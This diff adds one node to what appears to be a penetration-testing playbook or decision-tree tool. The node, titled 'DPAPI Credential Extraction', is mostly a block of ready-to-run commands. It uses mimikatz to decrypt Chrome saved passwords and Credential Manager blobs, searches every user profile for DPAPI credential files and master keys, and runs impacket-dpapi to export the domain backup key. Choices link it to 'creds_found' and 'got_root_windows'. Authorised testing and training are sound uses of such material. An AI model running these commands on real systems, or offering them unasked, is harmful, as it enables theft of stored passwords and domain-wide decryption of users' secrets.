@@ -1,0 +1,18 @@
+{
+  "id": "dpapi",
+  "phase": "WINDOWS",
+  "title": "DPAPI Credential Extraction",
+  "body": "DPAPI protects browser passwords, credential manager, and WiFi keys. Accessible as the user who encrypted them or as SYSTEM with the domain backup key.",
+  "cmd": "# Chrome saved passwords (as the user)\nmimikatz \"dpapi::chrome /in:%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data /unprotect\" exit\n\n# Credential Manager blobs\ncmdkey /list\nmimikatz \"vault::cred /patch\" exit\nmimikatz \"dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<blob>\" exit\n\n# Find all DPAPI blobs\ndir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>$null\ndir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>$null\n\n# Master keys needed to decrypt\ndir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>$null\n\n# From Kali with domain backup key (DA required)\nimpacket-dpapi backupkeys --export -t domain/admin:'pass'@$ip",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Found plaintext creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "Got domain backup key — decrypt all blobs",
+      "next": "got_root_windows"
+    }
+  ]
+}
